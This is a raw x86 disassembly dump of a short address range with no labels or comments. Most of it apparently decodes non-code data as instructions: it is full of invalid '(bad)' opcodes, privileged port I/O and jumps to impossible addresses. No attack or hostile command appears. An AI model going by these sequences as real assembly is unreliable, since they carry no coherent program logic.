  42c101:	arpl   WORD PTR [ecx+0x325ea2a],si
  42c107:	push   cs
  42c108:	xchg   esi,eax
  42c109:	mov    ebp,0xef69ae58
  42c10e:	in     eax,dx
  42c10f:	mov    al,ds:0xfe8f4f01
  42c114:	inc    ebp
  42c115:	loope  0x42c131
  42c117:	in     al,0x58
  42c119:	or     BYTE PTR [edi-0x78e21df6],ch
  42c11f:	cs push ebp
  42c121:	ds jp  0x42c14a
  42c124:	call   esp
  42c126:	(bad)
  42c129:	lods   al,BYTE PTR ds:[esi]
  42c12a:	ja     0x42c142
  42c12c:	stos   DWORD PTR es:[edi],eax
  42c12d:	pushf  
  42c12e:	mov    eax,ds:0x9e73a2dd
  42c133:	pop    esp
  42c134:	cdq    
  42c135:	imul   eax,DWORD PTR [eax-0x44ad6168],0xffffff84
  42c13c:	pop    edi
  42c13d:	mov    ecx,0x1c6041df
  42c142:	and    ecx,DWORD PTR [esi]
  42c144:	mov    bl,BYTE PTR [edi+0xc73b510]
  42c14a:	outs   dx,BYTE PTR ds:[esi]
  42c14b:	mov    bl,0x4a
  42c14d:	dec    edi
  42c14e:	imul   ebx,edx,0x7f
  42c151:	sbb    ebp,ebp
  42c153:	xor    DWORD PTR [eax],ebp
  42c155:	mov    bl,0x8
  42c157:	jmp    0x42c1c7
  42c159:	push   ecx
  42c15a:	inc    esi
  42c15b:	or     ebp,DWORD PTR ds:0x28f34692
  42c161:	mov    esi,0x4075ad4e
  42c166:	sbb    BYTE PTR [eax],bl
  42c168:	xchg   ebp,ecx
  42c16a:	fs inc esp
  42c16c:	or     BYTE PTR [edi+edx*8+0x3fd01ed8],ah
  42c173:	pop    eax
  42c174:	xchg   edi,eax
  42c175:	jp     0x42c107
  42c177:	imul   edi,DWORD PTR [esi],0xfc27e90f
  42c17d:	sub    ecx,DWORD PTR [ebx+0x28005b35]
  42c183:	test   DWORD PTR [eax+0x3e],0xfd877b90
  42c18a:	xor    cl,bl
  42c18c:	adc    BYTE PTR [edi+0x232d4901],al
  42c192:	aaa    
  42c193:	cmp    al,0xfe
  42c195:	mov    ch,0xb8
  42c197:	fldenv [edi-0x117477c2]
  42c19d:	mov    dl,0x8f
  42c19f:	sti    
  42c1a0:	scas   eax,DWORD PTR es:[edi]
  42c1a1:	jmp    0x8eef:0xe54b9764
  42c1a8:	fs dec edi
  42c1aa:	dec    edi
  42c1ab:	cmc    
  42c1ac:	sbb    esi,DWORD PTR [edi-0x31e4c450]
  42c1b2:	mov    edx,es
  42c1b4:	popa   
  42c1b5:	lahf   
  42c1b6:	inc    ecx
  42c1b7:	aad    0x46
  42c1b9:	dec    esp
  42c1ba:	ja     0x42c223
  42c1bc:	and    DWORD PTR [ebp+0x4c],esp
  42c1bf:	pop    esp
  42c1c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c1c1:	pop    ds
  42c1c2:	dec    esp
  42c1c3:	js     0x42c1cc
  42c1c5:	dec    edi
  42c1c6:	push   ds
  42c1c7:	mov    dl,0x57
  42c1c9:	mov    ds:0xe926685f,al
  42c1ce:	push   edi
  42c1cf:	test   BYTE PTR [ebx-0x6e7b0684],dh
  42c1d5:	test   eax,0x2ac6fb8f
  42c1da:	pushf  
  42c1db:	outs   dx,DWORD PTR ds:[esi]
  42c1dc:	inc    eax
  42c1dd:	sbb    BYTE PTR [edx+0x18],bh
  42c1e0:	bound  ebp,QWORD PTR [eax+0x4a]
  42c1e3:	sbb    bl,bh
  42c1e5:	mov    ecx,0x3a8d333d
  42c1ea:	mov    bl,0xd4
  42c1ec:	mov    ebp,0xa8
	...
  42c255:	add    BYTE PTR [ecx-0x7e],ch
  42c258:	int    0xae
  42c25a:	out    dx,eax
  42c25b:	out    dx,eax
  42c25c:	imul   eax,edi,0xfffffff2
  42c25f:	nop
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	es ret 0x8703
  42c266:	fld    DWORD PTR [bx+di]
  42c269:	add    BYTE PTR [eax],al
  42c26b:	add    DWORD PTR [eax],eax
  42c26d:	add    BYTE PTR [ecx+ecx*2-0x7d85a5c],dh
  42c274:	sub    eax,0xe3e73d4f
  42c279:	fcmovnu st,st(5)
  42c27b:	push   ebp
  42c27c:	xchg   edx,eax
  42c27d:	ss pop ebp
  42c27f:	and    DWORD PTR ss:0x527fa48c,esi
  42c286:	inc    eax
  42c287:	sub    BYTE PTR [ebx+0x67],dl
  42c28a:	retf   0x1b2a
  42c28d:	test   BYTE PTR [edi-0x42],cl
  42c290:	test   BYTE PTR [ebp+0x7aeac275],0x8c
  42c297:	cmp    BYTE PTR [eax+ebp*2],bh
  42c29a:	xlat   BYTE PTR ds:[ebx]
  42c29b:	scas   eax,DWORD PTR es:[edi]
  42c29c:	out    0x7d,al
  42c29e:	jecxz  0x42c31d
  42c2a0:	arpl   WORD PTR [eax],di
  42c2a2:	sub    BYTE PTR [ecx-0x7a96ea49],ch
  42c2a8:	aaa    
  42c2a9:	outs   dx,BYTE PTR ds:[esi]
  42c2aa:	not    DWORD PTR [ecx+0x43126fda]
  42c2b0:	mov    esp,0x1452375d
  42c2b5:	cmp    DWORD PTR [ebx-0x25],esp
  42c2b8:	or     eax,0x807b90e2
  42c2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c2be:	xchg   ecx,eax
  42c2bf:	jnp    0x42c2db
  42c2c1:	pop    esp
  42c2c2:	fidiv  WORD PTR [edi+0x276b4d3e]
  42c2c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2c9:	fsub   st,st(2)
  42c2cb:	mov    ds:0xb4742b4a,al
  42c2d0:	enter  0x59f7,0xf5
  42c2d4:	lea    esp,[ecx-0x63671de7]
  42c2da:	lock add al,0x3a
  42c2dd:	clc    
  42c2de:	dec    edi
  42c2df:	or     eax,0xafc25ce5
  42c2e4:	mov    ah,0x12
  42c2e6:	mov    ch,0x4b
  42c2e8:	(bad)  
  42c2e9:	and    dl,bl
  42c2eb:	in     al,0xe4
  42c2ed:	outs   dx,DWORD PTR ds:[esi]
  42c2ee:	adc    BYTE PTR [edx+0x12],0x53
  42c2f2:	addr16 loopne 0x42c366
  42c2f5:	aas    
  42c2f6:	les    ecx,FWORD PTR [ecx+0x3c]
  42c2f9:	lods   al,BYTE PTR ds:[esi]
  42c2fa:	pop    es
  42c2fb:	dec    ebp
  42c2fc:	arpl   ax,ax
  42c2fe:	xor    ebp,esi
  42c300:	jns    0x42c2b9
  42c302:	sti    
  42c303:	inc    esi
  42c304:	mov    bl,0xdc
  42c306:	push   ss
  42c307:	leave  
  42c308:	jmp    0x4083b2c5
  42c30d:	jmp    0x42c331
  42c30f:	xor    al,0xe4
  42c311:	or     BYTE PTR [ecx+0x6656dda3],ch
  42c317:	shl    BYTE PTR [eax],0xb5
  42c31a:	(bad)  [edi+0x646024c8]
  42c320:	mov    ebx,0x27e5f080
  42c325:	sub    BYTE PTR [edi-0x5319677d],bl
  42c32b:	add    al,0x23
  42c32d:	xchg   esp,eax
  42c32e:	or     al,0x7c
  42c330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c331:	cmc    
  42c332:	sti    
  42c333:	adc    al,0xfe
  42c335:	xchg   ebx,eax
  42c336:	jmp    0x13ea8ee7
  42c33b:	enter  0xe3a3,0x5e
  42c33f:	push   ecx
  42c340:	add    ebx,DWORD PTR [eax+0x507898d3]
  42c346:	dec    ebx
  42c347:	sub    dh,BYTE PTR [ecx]
  42c349:	dec    esp
  42c34a:	bound  ebp,QWORD PTR [ebx]
  42c34c:	dec    edi
  42c34d:	push   ss
  42c34e:	adc    BYTE PTR [edx-0xc],bh
  42c351:	shr    cl,1
  42c353:	dec    ebx
  42c354:	mov    ecx,0x5f1eb2a7
  42c359:	inc    ebp
  42c35a:	int    0x73
  42c35c:	add    edi,ebx
  42c35e:	push   ecx
  42c35f:	xchg   edi,eax
  42c360:	add    BYTE PTR [eax-0x66],ch
  42c363:	mov    ah,0x64
  42c365:	mov    bl,0x8f
  42c367:	or     al,0x53
  42c369:	(bad)  
  42c36a:	fidivr DWORD PTR [esi+edi*1+0x16]
	...
  42c3d5:	add    dh,ah
  42c3d7:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0xcaf216f6
  42c3e5:	pop    ebp
  42c3e6:	fiadd  DWORD PTR [bx+di]
  42c3e9:	add    BYTE PTR [eax],al
  42c3eb:	add    DWORD PTR [eax],eax
  42c3ed:	add    BYTE PTR [ecx-0x2d427cda],dh
  42c3f3:	mov    edi,0x5af2db42
  42c3f8:	clc    
  42c3f9:	push   eax
  42c3fa:	loope  0x42c3bb
  42c3fc:	cmp    al,0x7f
  42c3fe:	cmp    al,0x43
  42c400:	push   ss
  42c401:	ret    0x10cf
  42c404:	jg     0x42c46d
  42c406:	stos   BYTE PTR es:[edi],al
  42c407:	das    
  42c408:	std    
  42c409:	or     eax,0x21f22ff9
  42c40e:	loopne 0x42c3e0
  42c410:	stos   DWORD PTR es:[edi],eax
  42c411:	xor    DWORD PTR [edx+0x723b0010],edx
  42c417:	xchg   esp,eax
  42c418:	or     BYTE PTR [ebx],bl
  42c41a:	popa   
  42c41b:	or     eax,ecx
  42c41d:	cs jns 0x42c49b
  42c420:	sbb    DWORD PTR [bp+di],0x298ec9fe
  42c427:	loope  0x42c475
  42c429:	xchg   esp,eax
  42c42a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c42b:	pop    esi
  42c42c:	mov    dh,0xc7
  42c42e:	mov    ebp,0xf237c89a
  42c433:	xor    dl,BYTE PTR [esi]
  42c435:	test   cl,0x26
  42c438:	cld    
  42c439:	scas   al,BYTE PTR es:[edi]
  42c43a:	dec    esi
  42c43b:	mov    ebp,0x36fe1928
  42c440:	ins    DWORD PTR es:[edi],dx
  42c441:	sub    BYTE PTR [ebx],bh
  42c443:	push   0x10
  42c445:	cmp    DWORD PTR [ecx],esi
  42c447:	mov    cs:0x55ccc6c4,eax
  42c44d:	jp     0x42c43a
  42c44f:	ja     0x42c400
  42c451:	cs pop ecx
  42c453:	aas    
  42c454:	push   0xa42d4408
  42c459:	repnz push edx
  42c45b:	(bad)  
  42c45c:	adc    al,0x82
  42c45e:	loope  0x42c431
  42c460:	loope  0x42c4c1
  42c462:	ins    BYTE PTR es:[edi],dx
  42c463:	mov    cl,0x66
  42c465:	push   eax
  42c466:	shr    DWORD PTR [ebx+0x69],cl
  42c469:	push   eax
  42c46a:	stc    
  42c46b:	mov    ?,WORD PTR [esi]
  42c46d:	mov    esp,0xbcba7d4f
  42c472:	call   0x6d30860e
  42c477:	inc    eax
  42c478:	xchg   esp,eax
  42c479:	add    al,0x26
  42c47b:	dec    ebx
  42c47c:	mov    eax,ebp
  42c47e:	gs loop 0x42c430
  42c481:	nop
  42c482:	pop    ebp
  42c483:	leave  
  42c484:	ss jno 0x42c493
  42c487:	shl    esp,1
  42c489:	add    DWORD PTR [edx+eiz*1],0xfffffff9
  42c48d:	fisub  WORD PTR [ebx]
  42c48f:	or     DWORD PTR [eax],ebp
  42c491:	test   DWORD PTR [ebp+0x3b],ebp
  42c494:	loop   0x42c41b
  42c496:	push   esi
  42c497:	pop    esp
  42c498:	cmp    eax,0xfeb9643
  42c49d:	repnz add BYTE PTR [eax+0x217a378d],bh
  42c4a4:	leave  
  42c4a5:	and    DWORD PTR [ebp+0x3c],ecx
  42c4a8:	les    esi,FWORD PTR [ebx]
  42c4aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c4ab:	stos   DWORD PTR es:[edi],eax
  42c4ac:	push   esi
  42c4ad:	pop    esp
  42c4ae:	or     eax,0xa0ccea73
  42c4b3:	and    ah,BYTE PTR [edi-0x1b]
  42c4b6:	or     dl,BYTE PTR [ecx-0x3b1a0d29]
  42c4bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c4bd:	pusha  
  42c4be:	fdivr  st(0),st
  42c4c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c4c1:	xor    BYTE PTR [ebx+0x14],bl
  42c4c4:	mov    eax,0x8b236548
  42c4c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c4ca:	or     DWORD PTR [ebx+0x27],ebx
  42c4cd:	xchg   esp,eax
  42c4ce:	xchg   esp,eax
  42c4cf:	in     eax,0x37
  42c4d1:	rol    eax,cl
  42c4d3:	in     eax,0x6
  42c4d5:	int    0xb8
  42c4d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c4d8:	cmp    DWORD PTR [ebx-0x342b839d],edx
  42c4de:	mov    esi,0xddea23f
  42c4e3:	fs je  0x42c46c
  42c4e6:	sbb    ebx,DWORD PTR [ebx+esi*1-0x721892af]
  42c4ed:	jmp    0x0:0x0
	...
  42c554:	add    BYTE PTR [eax],al
  42c556:	in     al,dx
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0xce34,0x8e
  42c564:	mov    bl,0x11
  42c566:	fild   DWORD PTR [bx+di]
  42c569:	add    BYTE PTR [eax],al
  42c56b:	add    DWORD PTR [eax],eax
  42c56d:	add    al,dl
  42c56f:	xchg   ebx,eax
  42c570:	dec    edx
  42c571:	cmp    dl,BYTE PTR [edi]
  42c573:	sub    eax,0x45e31cd1
  42c578:	xchg   BYTE PTR [ebx],al
  42c57a:	cmp    ebx,DWORD PTR [esi-0x7f]
  42c57d:	stos   BYTE PTR es:[edi],al
  42c57e:	sub    eax,0x592cdccf
  42c583:	pusha  
  42c584:	or     eax,0x11024c71
  42c589:	in     eax,0x5f
  42c58b:	push   esp
  42c58c:	leave  
  42c58d:	sub    eax,0x2948cd5f
  42c592:	and    BYTE PTR [ebp+0x27979097],dl
  42c598:	mov    eax,ss:0xeb05b75
  42c59e:	push   0x20
  42c5a0:	mov    edi,0x933735f4
  42c5a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c5a6:	or     BYTE PTR [eax+0x3d3be66c],bh
  42c5ac:	rol    DWORD PTR [edi+0x21d508b8],1
  42c5b2:	inc    ebp
  42c5b3:	sbb    BYTE PTR [edi+0xd],ah
  42c5b6:	out    0x45,al
  42c5b8:	fwait
  42c5b9:	ror    DWORD PTR [eax],cl
  42c5bb:	push   esp
  42c5bc:	cmp    DWORD PTR [eax-0x5cf4c2ba],esi
  42c5c2:	mov    edi,0xa9e6acaa
  42c5c7:	jge    0x42c625
  42c5c9:	mov    ebx,0xd6b7b9cf
  42c5ce:	push   0xa681865e
  42c5d3:	jmp    0x7e9e34a0
  42c5d8:	leave  
  42c5d9:	es push 0x3f
  42c5dc:	mov    esp,0xb1fca71c
  42c5e1:	mov    WORD PTR [edi],?
  42c5e3:	loop   0x42c647
  42c5e5:	std    
  42c5e6:	jb     0x42c5b9
  42c5e8:	or     DWORD PTR [ecx+0x6ca10233],esi
  42c5ee:	aas    
  42c5ef:	(bad)  
  42c5f0:	push   ss
  42c5f1:	cdq    
  42c5f2:	es adc cl,bl
  42c5f5:	pop    ecx
  42c5f6:	push   ss
  42c5f7:	mov    cs:0x1eeff5c2,al
  42c5fd:	mov    ebx,DWORD PTR [ebp+0x30]
  42c600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c601:	in     eax,0x78
  42c603:	div    DWORD PTR [esi-0x5d]
  42c606:	mov    eax,0x63755adc
  42c60b:	popf   
  42c60c:	xchg   edi,eax
  42c60d:	fwait
  42c60e:	(bad)  
  42c60f:	shl    BYTE PTR [esi+0x5d31b9f5],0x40
  42c616:	xchg   ebp,eax
  42c617:	sub    DWORD PTR [ecx],0x1
  42c61a:	jno    0x42c671
  42c61c:	push   0xffffffe2
  42c61e:	popa   
  42c61f:	ret    
  42c620:	and    eax,0x984acbba
  42c625:	xchg   ebx,eax
  42c626:	clc    
  42c627:	aaa    
  42c628:	sub    edi,DWORD PTR [eax]
  42c62a:	bound  ebx,QWORD PTR [edx*2-0x387e03f5]
  42c631:	into   
  42c632:	xor    al,BYTE PTR [ebp+eax*4+0x14]
  42c636:	lods   al,BYTE PTR ds:[esi]
  42c637:	jmp    0x7188ec58
  42c63c:	aad    0xa7
  42c63e:	call   0x578c23c4
  42c643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c644:	mov    eax,0xf7821825
  42c649:	sbb    eax,ebx
  42c64b:	mov    ebp,0x3e01e87c
  42c650:	dec    edx
  42c651:	jmp    0x3b5674f8
  42c656:	mov    dh,0x31
  42c658:	das    
  42c659:	adc    al,0x4a
  42c65b:	mov    eax,0xe2c11e9a
  42c660:	push   ebp
  42c661:	std    
  42c662:	int    0x68
  42c664:	inc    edi
  42c665:	mov    ds:0x76452b3f,al
  42c66a:	daa    
  42c66b:	and    ebx,edi
  42c66d:	and    al,0x0
	...
  42c6d3:	add    BYTE PTR [eax],al
  42c6d5:	add    BYTE PTR [ebp+0x48],bl
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx+0x346dfc6b]
  42c6e3:	inc    esp
  42c6e4:	in     eax,0x7c
  42c6e6:	fadd   QWORD PTR [bx+di]
  42c6e9:	add    BYTE PTR [eax],al
  42c6eb:	add    DWORD PTR [eax],eax
  42c6ed:	add    BYTE PTR [esp+ebp*8],bh
  42c6f0:	adc    eax,0x7230739e
  42c6f5:	pop    ss
  42c6f6:	mov    eax,0x5a65b12
  42c6fb:	mov    ah,ah
  42c6fd:	popa   
  42c6fe:	sub    al,0x6
  42c701:	cmp    al,0xe7
  42c703:	sar    DWORD PTR [ecx-0x55f0d968],cl
  42c709:	jge    0x42c71b
  42c70b:	loop   0x42c713
  42c70d:	cmp    dl,BYTE PTR [edi-0x56f9b680]
  42c713:	pop    esp
  42c714:	mul    BYTE PTR [edi+0x26ba105]
  42c71a:	(bad)  
  42c71b:	pop    ebp
  42c71c:	cmp    eax,0x33e9cfa4
  42c721:	push   ebp
  42c722:	mov    ds:0x41d706ca,al
  42c727:	xor    DWORD PTR ds:0x6ef26ab1,eax
  42c72d:	jp     0x42c76a
  42c72f:	lods   eax,DWORD PTR ds:[esi]
  42c730:	pop    ds
  42c731:	mov    ds:0x535e96dd,eax
  42c736:	fdiv   QWORD PTR [edx+0x34ed670c]
  42c73c:	push   ebp
  42c73d:	iret   
  42c73e:	mov    dh,0x30
  42c740:	jnp    0x42c735
  42c742:	aas    
  42c743:	into   
  42c744:	iret   
  42c745:	or     DWORD PTR [ebp+0x69],edx
  42c748:	mov    al,0x3d
  42c74a:	sbb    eax,0xb11fd409
  42c74f:	popa   
  42c750:	enter  0x102d,0x16
  42c754:	jno    0x42c75d
  42c756:	dec    edi
  42c757:	xchg   edx,eax
  42c758:	imul   edx,DWORD PTR [ecx+0x78b58f12],0xd326bb3d
  42c762:	call   ebp
  42c764:	popa   
  42c765:	rdmsr  
  42c767:	mov    ebx,0xb124e8b0
  42c76c:	out    dx,al
  42c76d:	repz mov ecx,0xfe608adb
  42c773:	xchg   ecx,eax
  42c774:	inc    ecx
  42c775:	jg     0x42c776
  42c777:	xchg   DWORD PTR [edi],esi
  42c779:	jl     0x42c7c3
  42c77b:	js     0x42c729
  42c77d:	in     al,dx
  42c77e:	mov    bl,0x80
  42c780:	std    
  42c781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c782:	push   0xffffffaa
  42c784:	aad    0x32
  42c786:	push   es
  42c787:	fnstcw WORD PTR [ecx+0x20cab16a]
  42c78d:	std    
  42c78e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c78f:	jmp    0xdf9d3a38
  42c794:	pop    es
  42c795:	dec    edi
  42c796:	xor    cl,BYTE PTR [eax]
  42c798:	jg     0x42c7ba
  42c79a:	and    ebx,DWORD PTR [edi]
  42c79c:	or     eax,DWORD PTR [edx-0x40]
  42c79f:	cmp    eax,0x96946785
  42c7a4:	push   ss
  42c7a5:	dec    edi
  42c7a6:	lds    eax,FWORD PTR [esi-0x3f06afdf]
  42c7ac:	inc    esi
  42c7ad:	and    al,0x35
  42c7af:	sub    bh,BYTE PTR [ecx]
  42c7b1:	mov    WORD PTR [edi],gs
  42c7b3:	push   ebx
  42c7b4:	jbe    0x42c7d4
  42c7b6:	icebp  
  42c7b7:	(bad)  
  42c7b8:	cmp    BYTE PTR [esi+0x5],dl
  42c7bb:	(bad)  
  42c7bc:	or     eax,0x820aa203
  42c7c1:	(bad)  
  42c7c2:	sbb    esi,DWORD PTR [edi+0x37]
  42c7c5:	pop    ebp
  42c7c6:	pushf  
  42c7c7:	or     DWORD PTR [eax],eax
  42c7c9:	setl   BYTE PTR [ecx+0x136de7ed]
  42c7d0:	mov    ds,WORD PTR [esi]
  42c7d2:	mov    eax,0x53d29674
  42c7d7:	gs mov cl,0xd1
  42c7da:	inc    edi
  42c7db:	sub    al,0x5c
  42c7dd:	jb     0x42c7e9
  42c7df:	mov    ah,0x51
  42c7e1:	mov    BYTE PTR [eax-0x35],bh
  42c7e4:	aad    0xe4
  42c7e6:	ins    BYTE PTR es:[edi],dx
  42c7e7:	sbb    DWORD PTR [esi],edi
  42c7e9:	jecxz  0x42c864
  42c7eb:	test   BYTE PTR [ecx+edx*2],cl
	...
  42c856:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c85c:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c862:	pushf  
  42c863:	add    edx,DWORD PTR [edx+0x1dd67a5]
  42c869:	add    BYTE PTR [eax],al
  42c86b:	add    DWORD PTR [eax],eax
  42c86d:	add    bl,dl
  42c86f:	nop
  42c870:	inc    edi
  42c871:	jae    0x42c817
  42c873:	jnp    0x42c834
  42c875:	repnz cs and al,0x30
  42c879:	imul   BYTE PTR [esi]
  42c87b:	outs   dx,BYTE PTR ds:[esi]
  42c87c:	popa   
  42c87d:	cmp    ebp,edx
  42c87f:	addr16 push 0x21
  42c882:	dec    esi
  42c883:	mov    esp,0xa72adbbf
  42c888:	jg     0x42c8b6
  42c88a:	je     0x42c89a
  42c88c:	rcr    esp,0x67
  42c88f:	lahf   
  42c890:	test   al,0x96
  42c892:	sub    DWORD PTR [ebp+0x2edd6e6a],edx
  42c898:	push   edi
  42c899:	push   esp
  42c89a:	jg     0x42c837
  42c89c:	push   es
  42c89d:	outs   dx,BYTE PTR ds:[esi]
  42c89e:	inc    ebx
  42c89f:	pop    es
  42c8a0:	xchg   DWORD PTR [esi],edx
  42c8a2:	push   edx
  42c8a3:	push   eax
  42c8a4:	repnz or al,0x8d
  42c8a7:	pop    eax
  42c8a8:	pop    ecx
  42c8a9:	in     eax,0x9f
  42c8ab:	mov    ax,0x6888
  42c8af:	(bad)  
  42c8b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c8b1:	out    0xaa,eax
  42c8b3:	mov    ah,0x8f
  42c8b5:	pop    ebx
  42c8b6:	sti    
  42c8b7:	test   BYTE PTR [ecx+0x4d],cl
  42c8ba:	sahf   
  42c8bb:	sahf   
  42c8bc:	mov    eax,0xcb1e626d
  42c8c1:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8c3:	(bad)  
  42c8c4:	and    DWORD PTR [edi],ecx
  42c8c6:	sub    dl,BYTE PTR [ebp+eiz*2+0x5070d850]
  42c8cd:	xchg   esp,eax
  42c8ce:	inc    eax
  42c8cf:	arpl   WORD PTR [esi-0x3b],bx
  42c8d2:	sbb    eax,0xc8a3b124
  42c8d7:	sar    DWORD PTR [eax+ebx*8+0x5a],0xc5
  42c8dc:	sub    dl,ah
  42c8de:	bound  edi,QWORD PTR [ecx+0x34]
  42c8e1:	fsubr  DWORD PTR [ebx+0x2781bddc]
  42c8e7:	shl    BYTE PTR [esi+edi*1-0x11],cl
  42c8eb:	fidivr WORD PTR [esi+0x77a495e4]
  42c8f1:	jle    0x809fc349
  42c8f7:	push   ecx
  42c8f8:	pop    ds
  42c8f9:	push   ds
  42c8fa:	mov    ah,0x14
  42c8fc:	pop    esp
  42c8fd:	pop    esp
  42c8fe:	ja     0x42c8e3
  42c900:	inc    ebp
  42c901:	bound  esp,QWORD PTR [esi+0x5e]
  42c904:	lahf   
  42c905:	pop    ebx
  42c906:	das    
  42c907:	add    al,0x55
  42c909:	cmp    eax,0x15653a2a
  42c90e:	mov    ds:0xa3a2140b,eax
  42c913:	cmp    al,0x9a
  42c915:	aaa    
  42c916:	xchg   ebp,eax
  42c917:	cmp    al,0xe6
  42c919:	je     0x42c8d8
  42c91b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c91c:	out    0x1d,eax
  42c91e:	jne    0x42c998
  42c920:	or     bl,ah
  42c922:	push   ebp
  42c923:	iret   
  42c924:	scas   eax,DWORD PTR es:[edi]
  42c925:	mov    ebp,DWORD PTR [eax+esi*4]
  42c928:	or     BYTE PTR [ebx],al
  42c92a:	jb     0x42c8b0
  42c92c:	scas   eax,DWORD PTR es:[edi]
  42c92d:	sbb    al,0xfd
  42c92f:	inc    esp
  42c930:	mov    BYTE PTR [edx],dl
  42c932:	add    edi,DWORD PTR [edx-0x49]
  42c935:	loop   0x42c9ad
  42c937:	in     eax,0xc
  42c939:	push   edx
  42c93a:	push   0x83d3547c
  42c93f:	jl     0x42c9a9
  42c941:	mov    WORD PTR [ecx+edi*2],ss
  42c944:	ss adc eax,0xcfffbbb6
  42c94a:	retf   
  42c94b:	outs   dx,BYTE PTR ds:[esi]
  42c94c:	cmp    ebp,DWORD PTR [ecx-0x1b]
  42c94f:	sahf   
  42c950:	fcmovnu st,st(5)
  42c952:	sbb    eax,0x2a217a8a
  42c957:	idiv   ch
  42c959:	imul   ebp,DWORD PTR [esi+0x33],0xaa99b385
  42c960:	xchg   edi,eax
  42c961:	cmc    
  42c962:	push   ss
  42c963:	sub    bl,BYTE PTR [esi]
  42c965:	pop    esp
  42c966:	ret    
  42c967:	mov    al,ds:0x4b725174
  42c96c:	int    0x4f
	...
  42c9d6:	adc    BYTE PTR [ebx],bl
  42c9d8:	leave  
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0x4633021
  42c9e6:	fiadd  WORD PTR [bx+di]
  42c9e9:	add    BYTE PTR [eax],al
  42c9eb:	add    DWORD PTR [eax],eax
  42c9ed:	add    BYTE PTR [ebx+0x6c64ecb],ah
  42c9f3:	mov    esi,0xdd56abe5
  42c9f8:	leave  
  42c9f9:	sbb    cl,BYTE PTR [eax+ebp*4+0x1a7e0c8f]
  42ca00:	in     eax,0x35
  42ca02:	dec    ecx
  42ca03:	ss inc esi
  42ca05:	xor    al,0xb7
  42ca07:	dec    ecx
  42ca08:	pusha  
  42ca09:	adc    al,0xc5
  42ca0b:	and    ch,BYTE PTR [eax]
  42ca0d:	lea    edi,[ebx-0x4b83b8b6]
  42ca13:	(bad)
  42ca16:	mov    ds:0x675b46ef,eax
  42ca1b:	in     eax,0x4d
  42ca1d:	xor    al,bh
  42ca1f:	call   0xf675:0x3fa48144
  42ca26:	xchg   ecx,eax
  42ca27:	lds    eax,FWORD PTR [ebx+0x75917352]
  42ca2d:	jge    0x42ca3c
  42ca2f:	xchg   ecx,eax
  42ca30:	in     eax,dx
  42ca31:	cmp    DWORD PTR ds:0x4b11e9a7,0x7a
  42ca38:	inc    ecx
  42ca39:	adc    BYTE PTR [ecx+0x30],ah
  42ca3c:	dec    esi
  42ca3d:	ficomp WORD PTR [ebp+0x2d]
  42ca40:	imul   ebp,DWORD PTR [esi-0x4ae84acf],0xfffffffd
  42ca47:	dec    edi
  42ca48:	fild   WORD PTR [edi-0x7d]
  42ca4b:	sbb    BYTE PTR [ebp+0x3d0ba836],dh
  42ca51:	mov    dl,0xd9
  42ca53:	mov    ch,0xaf
  42ca55:	jmp    0x42ca2d
  42ca57:	rcr    ebx,cl
  42ca59:	push   esi
  42ca5a:	ficomp WORD PTR [edi]
  42ca5c:	adc    esp,DWORD PTR [edx+0x54]
  42ca5f:	outs   dx,DWORD PTR ds:[esi]
  42ca60:	and    ecx,DWORD PTR [esi+eax*4+0x75a7eb96]
  42ca67:	loopne 0x42ca68
  42ca69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca6a:	cmp    BYTE PTR [ecx-0x73],ch
  42ca6d:	imul   edx,DWORD PTR gs:[edx-0x551024bb],0xaa77069
  42ca78:	call   0x8813:0xed67e330
  42ca7f:	mov    bh,0x10
  42ca81:	ins    DWORD PTR es:[edi],dx
  42ca82:	push   0xc699711a
  42ca87:	add    BYTE PTR [eax+edi*1+0x5b],dh
  42ca8b:	ins    DWORD PTR es:[edi],dx
  42ca8c:	(bad)  
  42ca8d:	fild   DWORD PTR [ebp+0x7]
  42ca90:	adc    al,cl
  42ca92:	adc    BYTE PTR [esi+0x233a984d],0xa6
  42ca99:	dec    edx
  42ca9a:	inc    ebx
  42ca9b:	outs   dx,BYTE PTR ds:[esi]
  42ca9c:	mov    ds:0xb1941f69,al
  42caa1:	stc    
  42caa2:	jmp    0xa5ad:0xd989fc45
  42caa9:	lock jmp 0xf014:0x6e2907a7
  42cab1:	stc    
  42cab2:	cmp    eax,0xf7430fc3
  42cab7:	mov    edi,0xe96a06eb
  42cabc:	shl    BYTE PTR [ecx+eax*8-0x598a414d],1
  42cac3:	sub    ch,0x76
  42cac6:	xor    eax,0xfd7483c
